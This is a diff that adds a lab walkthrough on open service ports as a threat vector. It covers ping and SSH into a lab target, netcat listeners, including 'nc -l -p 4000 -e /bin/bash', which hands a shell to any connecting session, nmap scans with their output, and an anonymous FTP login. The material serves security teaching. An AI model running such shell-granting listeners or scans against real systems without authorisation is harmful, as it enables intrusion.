@@ -1,6 +1,8 @@
 
 "Open Service Ports" as a threat vector refers to the security risk posed by active and accessible communication endpoints on a network. Attackers may exploit vulnerabilities in services running on these open ports to gain unauthorized access or disrupt systems. Mitigation involves monitoring, limiting unnecessary services, using firewalls, and implementing access controls to enhance security.
 
+With this lab exercise, we got a clear understanding of how the open service ports act as a threat vector and learned how to scan the ports and exploit the services running on them.
+
 In this lab environment, the user will get access to a Kali instance's GUI. A vulnerable target machine is deployed on http://demo.ine.local. Your task is to find and exploit the open service ports on the target machine.
 
 Objective: To scan and find the open service ports on the target machine and exploit the services running on them.
@@ -31,14 +33,226 @@ The best tools for this lab are:
 • Netcat Netcat (nc): is a versatile networking tool used for tasks like port scanning, file transfer, remote shell access, chat, and network debugging. It's known as the "Swiss Army knife of networking" due to its flexibility.
 
 
+
 Step 1: Open the lab link to access the Kali machine.
 
+Step 2: Verify whether the target machine is up: ping -c 4 demo.ine.local
+
+The target machine is up and running.
+
+Step 3: Let's connect to the target machine using SSH.
+
+SSH, or Secure Shell, is a cryptographic network protocol used for secure remote communication and command execution on a computer network. It provides a secure way to access and manage devices over an unsecured network, such as the internet. SSH encrypts the communication between the client and the server, offering confidentiality and integrity of data. It's commonly used for remote administration, file transfers, and tunneling.
+
+Us the following command: ssh student@demo.ine.local
+
+When asked to continue connecting, type "yes" and press the enter key. In the next step, type the password for the student user, i.e., "Pass@student123" and press the enter key.
+Note: The password will not be visible to you while typing.
+
+We have connected to the target machine. Let's try to run some commands like: whoami
+We have logged in as the student user.
+
+Step 4: Without closing the current terminal, open a new one in a separate tab and find the IP address of the Kali machine using: ifconfig or ip addr
+
+In this case, the IP address of the Kali machine is 192.153.144.2; in your case, it might be different.
+
+Step 5: Use the Netcat tool to listen on TCP port 4000 of the Kali machine. And on the target machine, use netcat to connect to the listening instance (Kali).
+
+On the Kali machine's terminal, run the command given below to start a listener on port 4000.
+
+Use the following command: nc -l -p 4000
+
+The listener has started now on the Kali machine. Let's navigate back to the target machine's terminal (SSH session) and connect to this listener.
+
+Use the Kali machine's IP, which we got in the previous step, and run the command given to connect to the listener running on port 4000 on the Kali machine: nc <IP address of the Kali machine> 4000
+
+We have connected with the listener. Now type something on the terminal and press the enter key.
+
+Whatever the user types on this side will be replayed on the other side (Kali Machine). Navigate back to the Kali machine's terminal, and you will see the same text.
+
+Press "ctrl + c" to break the connection. In this manner, netcat can be used to create a listener and connector.
+
+Step 6: Use the Netcat tool to listen on port 4000 of the Kali machine and provide bash access to any session connecting to it. And on the target machine, use netcat to connect to the listening instance (Kali).
+
+Open the Kali machine's terminal and run the below-given command to start the listener on port 4000 and provide bash access to any session connecting to it. 
+
+Use the command: nc -l -p 4000 -e /bin/bash
+
+Navigate to the target machine's terminal (SSH session) and connect to the listener using: nc <IP address of the Kali machine> 4000
+
+We have connected with the listener. Now try running some commands and see what we get as an output: id, whoami
+
+We can see we got the output for the commands we ran. The setup is just like before; however, this time, the output of the commands has appeared on the connector side.
+
+Navigate to the listener's side, and you will see no commands have appeared on the listener's side. Press "ctrl + c" to break the connection.
+
+Now that we understand how ports work, let's scan the ports on the target machine.
+
+Step 7: Let's use the Nmap tool to scan and check the open ports on the target machine.
+
+Use the command: nmap demo.ine.local
+
+This command will perform a scan on the first 1,000 TCP ports. We can see the following TCP ports are open on the target machine, and we can also see the services running on them.
+
+Step 8: Perform the UDP scan on the target machine using: nmap -sU -p 50-200 demo.ine.local
+
+Note: The UDP (User Datagram Protocol) scans generally take longer than the TCP (Transmission Control Protocol) scans. This scan will take around 2–3 minutes.
+
+In the above command, we specified the range from port 50 to 200, and we can see in the output that port 123 is open.
+
+Step 9: Scan all the 65,535 TCP ports on a target machine using: nmap -p- demo.ine.local
+
+This command is used to instruct Nmap to scan all 65,535 TCP ports on a target host. The -p- option essentially tells Nmap to scan every possible port in the specified range (from 1 to 65,535). This can be useful for comprehensive network reconnaissance when you want to discover all open ports on a system.
+
+Step 10: Perform the service version scan using: nmap -sV demo.ine.local
+
+This command is used to perform a service version detection scan. It instructs Nmap to not only identify open ports on a target but also to determine the versions of the services running on those ports. This helps in gaining more detailed information about the target's software and can be valuable for understanding potential vulnerabilities and security risks.
+
+Step 11: Perform an aggressive scan on the target machine using: nmap -A demo.ine.local
+
+This command performs an aggressive scan (-A) on the target host demo.ine.local. This scan includes service version detection, script scanning, and OS detection, providing comprehensive information about the target's open ports, running services, operating system, and potential vulnerabilities.
+
+Here we found our vulnerable service, i.e., "FTP." The scan showed that the "ftp-anon" script is giving the output "Anonymous FTP login allowed."
+
+Also, we can see the other juicy information:
+
+root@INE:~# nmap -A demo.ine.local
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-23 16:26 IST
+Nmap scan report for demo.ine.local (192.78.49.3)
+Host is up (0.000035s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+21/tcp  open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+|     FTP server status:
+|      Connected to ::ffff:192.78.49.2
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|   End of status
+22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 23:4d:90:33:dd:6c:f1:76:51:0f:8d:a0:06:ce:f3:7b (ECDSA)
+|   256 53:91:62:d6:5a:51:ca:50:37:b0:52:4a:4a:41:45 (ED25519)
+25/tcp  open  smtp    Postfix smtpd
+|_smtp-commands: dd13004e5a3c.members.linode.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
+80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+143/tcp open  imap    Dovecot imapd (Ubuntu)
+|_imap-capabilities: ID OK more have post-login LITERAL+ listed Pre-login LOGIN-REFERRALS IDLE SASL-IR capabilities
+| ssl-cert: Subject: commonName=dd13004e5a3c
+| Subject Alternative Name: DNS:dd13004e5a3c
+| Not valid before: 2023-11-23T10:12:20
+| Not valid after:  2033-11-20T10:12:20
+|_ssl-date: TLS randomness does not represent time
+993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
+|_imap-capabilities: ID OK AUTH=PLAINA0001 post-login LITERAL+ more have LOGIN-REFERRALS IDLE SASL-IR capabilities
+| ssl-cert: Subject: commonName=dd13004e5a3c
+| Subject Alternative Name: DNS:dd13004e5a3c
+| Not valid before: 2023-11-23T10:12:20
+| Not valid after:  2033-11-20T10:12:20
+|_ssl-date: TLS randomness does not represent time
+
+MAC Address: 02:42:C0:4E:31:03 (Unknown)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Host: dd13004e5a3c.members.linode.com; OS: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.04 ms demo.ine.local (192.78.49.3)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
+
+
+Step 12: Now, let's exploit the vulnerable FTP service running on port 21 using: nmap --script ftp-anon demo.ine.local
+
+Here, we can see that the anonymous FTP login is allowed.
+
+root@INE:~# nmap --script ftp-anon demo.ine.local
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-23 16:35 IST
+Nmap scan report for demo.ine.local (192.78.49.3)
+Host is up (0.000010s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp  open  ssh
+25/tcp  open  smtp
+80/tcp  open  http
+143/tcp open  imap
+993/tcp open  imaps
+
+MAC Address: 02:42:C0:4E:31:03 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
+
+
+Let's try to login to the FTP server by specifying the username as "anonymous" and the password as a blank "" empty string using the command: ftp demo.ine.local
+
+root@INE:~# ftp demo.ine.local
+Connected to demo.ine.local.
+220 (vsFTPd 3.0.5)
+Name (demo.ine.local:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
 
 
 
+>> Commands Summarization <<
+
+ping -c 4 demo.ine.local
+ssh student@demo.ine.local
+
+whoami
+ifconfig or ip addr
+
+nc -l -p 4000
+nc <IP address of the Kali machine> 4000
+
+nc -l -p 4000 -e /bin/bash
+nc <IP address of the Kali machine> 4000
+
+id
+whoami
+
+ftp demo.ine.local
+
+We got the successful login message.
+
+
+-- Nmap --
+
+nmap demo.ine.local
+nmap -sU -p 50-200 demo.ine.local
+nmap -p- demo.ine.local
+nmap -sV demo.ine.local
+nmap -A demo.ine.local
+nmap --script ftp-anon demo.ine.local
 
 
 
+https://security.stackexchange.com/questions/10729/how-do-hackers-take-advantage-of-open-ports-as-a-vector-for-an-attack
+https://nmap.org
+https://netcat.sourceforge.net
 
 
 
